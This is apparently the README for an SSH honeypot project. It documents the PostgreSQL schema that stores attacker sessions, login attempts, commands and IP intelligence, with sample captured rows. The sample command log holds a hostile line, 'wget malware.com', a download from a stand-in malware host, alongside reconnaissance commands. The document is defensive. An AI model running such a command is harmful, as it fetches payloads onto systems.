# GhostTrap — PostgreSQL Database Integration

## Overview

This document describes the PostgreSQL database architecture used in the **GhostTrap SSH Honeypot**.

The database is deployed on a **separate VM (Proxmox)** to ensure isolation, scalability, and security.

---

## Step 1 - Architecture

```
[Attacker]
     ↓
[SSH Honeypot VM]
     ↓
[PostgreSQL VM]
     ↓
[Future: Dashboard / Analytics]
```

---

## Step 2 - Database Configuration

| Component     | Value            |
| ------------- | ---------------- |
| Database Name | `ghosttrap`      |
| Username      | `ghosttrap_user` |
| Host          | `192.168.31.190` |
| Port          | `5432`           |

---

## Step 3 - Setup

### Create Database & User

```sql
CREATE DATABASE ghosttrap;

CREATE USER ghosttrap_user 
WITH ENCRYPTED PASSWORD 'your_password';

GRANT ALL PRIVILEGES ON DATABASE ghosttrap 
TO ghosttrap_user;

\c ghosttrap

GRANT ALL ON SCHEMA public TO ghosttrap_user;
ALTER SCHEMA public OWNER TO ghosttrap_user;
```

---

## Step 4 -  Database Schema

### 1. Sessions

Stores each attacker session.

```sql
CREATE TABLE sessions (
    id SERIAL PRIMARY KEY,
    session_id UUID UNIQUE NOT NULL,
    src_ip INET NOT NULL,
    fake_user VARCHAR(100),
    start_time TIMESTAMP NOT NULL DEFAULT NOW(),
    end_time TIMESTAMP,
    duration INTERVAL,
    honeypot VARCHAR(50) DEFAULT 'ssh',
    vm VARCHAR(50) DEFAULT 'ubuntu',
    total_commands INTEGER DEFAULT 0,
    ai_calls INTEGER DEFAULT 0
);
```

---

### 2. Login Attempts

Captures brute-force activity.

```sql
CREATE TABLE login_attempts (
    id SERIAL PRIMARY KEY,
    session_id UUID NOT NULL,
    src_ip INET NOT NULL,
    username VARCHAR(255),
    password TEXT,
    attempt_number INTEGER,
    success BOOLEAN DEFAULT FALSE,
    timestamp TIMESTAMP NOT NULL DEFAULT NOW(),
    FOREIGN KEY (session_id) REFERENCES sessions(session_id) ON DELETE CASCADE
);
```

---

### 3. Commands

Stores attacker command execution.

```sql
CREATE TABLE commands (
    id SERIAL PRIMARY KEY,
    session_id UUID NOT NULL,
    src_ip INET NOT NULL,
    command TEXT NOT NULL,
    output TEXT,
    cwd TEXT,
    timestamp TIMESTAMP NOT NULL DEFAULT NOW(),
    FOREIGN KEY (session_id) REFERENCES sessions(session_id) ON DELETE CASCADE
);
```

---

### 4. IP Intelligence 

Enrichment layer for threat intelligence.

```sql
CREATE TABLE ip_intel (
    id SERIAL PRIMARY KEY,
    ip INET UNIQUE NOT NULL,
    country VARCHAR(100),
    city VARCHAR(100),
    asn VARCHAR(50),
    isp VARCHAR(255),
    org VARCHAR(255),
    is_proxy BOOLEAN,
    is_vpn BOOLEAN,
    is_tor BOOLEAN,
    first_seen TIMESTAMP DEFAULT NOW(),
    last_seen TIMESTAMP DEFAULT NOW()
);
```

---

## Step 5 -  Indexes (Performance)

```sql
CREATE INDEX idx_sessions_src_ip ON sessions(src_ip);
CREATE INDEX idx_login_attempts_session_id ON login_attempts(session_id);
CREATE INDEX idx_login_attempts_src_ip ON login_attempts(src_ip);
CREATE INDEX idx_commands_session_id ON commands(session_id);
CREATE INDEX idx_commands_src_ip ON commands(src_ip);
CREATE INDEX idx_commands_timestamp ON commands(timestamp);
CREATE INDEX idx_ip_intel_ip ON ip_intel(ip);
```

---

## Step 6 -  Security Configuration

### Enable Remote Access

**postgresql.conf**

```conf
listen_addresses = '*'
```

**pg_hba.conf**

```conf
host    ghosttrap    ghosttrap_user    192.168.31.0/24    md5
```

> ⚠️ Only allow internal network access. Do NOT expose port 5432 to the public internet.

---

## Step 7 -  Data Collection Flow

1. **Session Created** → on SSH connection
2. **Login Attempts Logged** → each credential try
3. **Commands Captured** → every shell command
4. **Session Updated** → on disconnect

---

##  Verification Queries

```sql
SELECT session_id, src_ip, start_time, end_time FROM sessions;

SELECT username, password, attempt_number, success 
FROM login_attempts;

SELECT command, cwd 
FROM commands 
ORDER BY id DESC;
```

---


##  Sample Data (Live Capture)

The following examples demonstrate real data captured by the GhostTrap SSH honeypot and stored in PostgreSQL.

---

###  Sessions

Tracks attacker sessions with timestamps and source IP.

```sql
SELECT session_id, src_ip, start_time, end_time FROM sessions;
```

```
              session_id              |     src_ip     |         start_time         |          end_time          
--------------------------------------+----------------+----------------------------+----------------------------
 3dd710a9-2d14-4e58-92d2-234cbdd7eb97 | 192.168.31.116 | 2026-03-27 19:49:51.39644  | 2026-03-27 19:50:26.419325
 2f767e57-762c-40ae-a4c8-6d278a67c46f | 192.168.31.212 | 2026-03-27 19:52:10.361886 | 2026-03-27 20:04:21.695767
 1079c4e6-d508-4724-b097-1a9e59c959ad | 192.168.31.116 | 2026-03-27 19:50:29.209798 | 2026-03-27 20:24:33.976964
 89983ecb-8e90-4b55-a7fb-0be19175354d | 192.168.31.116 | 2026-03-27 20:45:57.908732 | 2026-03-27 20:46:34.895611
```

---

###  Login Attempts

Captures brute-force attempts including credentials and success status.

```sql
SELECT username, password, attempt_number, success 
FROM login_attempts;
```

```
 username | password | attempt_number | success 
----------+----------+----------------+---------
 root     | asd      |              1 | f
 root     | asd      |              2 | t
 root     | kk       |              1 | f
 root     | kk       |              2 | t
 root     | sasd     |              1 | f
 root     | asd      |              2 | t
 ubuntu   | sdf      |              1 | f
 ubuntu   | sdf      |              2 | t
```

---

###  Commands Executed

Logs attacker behavior after gaining access.

```sql
SELECT command, cwd 
FROM commands 
ORDER BY id DESC;
```

```
 command            |     cwd      
--------------------+--------------
 exit               | /home/ubuntu
 ls                 | /home/ubuntu
 clear              | /home/ubuntu
 exit               | /home/ubuntu
 exit               | /home/ubuntu
 clear              | /home/ubuntu
 wget malware.com   | /home/ubuntu
 wget               | /home/ubuntu
 ls                 | /home/ubuntu
 clear              | /home/ubuntu
 exit               | /home/ubuntu
 id                 | /home/ubuntu
 whoami             | /home/ubuntu
 pwd                | /home/ubuntu
 ls                 | /home/ubuntu
 clear              | /home/ubuntu
```

---

###  IP Intelligence

Enriched attacker IP metadata stored for analysis.

```sql
SELECT ip, country, city, asn, isp FROM ip_intel;
```

```
   ip    |    country    |  city   |        asn         |    isp     
---------+---------------+---------+--------------------+------------
 8.8.8.8 | United States | Ashburn | AS15169 Google LLC | Google LLC
```

---

##  Insights

From the collected data, we can observe:

* Repeated brute-force attempts with common credentials (`root`, `ubuntu`)
* Automated login behavior (multiple attempts before success)
* Post-compromise activity such as:

  * reconnaissance (`whoami`, `id`, `pwd`)
  * filesystem exploration (`ls`)
  * potential malware download attempts (`wget malware.com`)
* IP-level intelligence enabling:

  * ASN-based attribution
  * Geographic distribution analysis

---

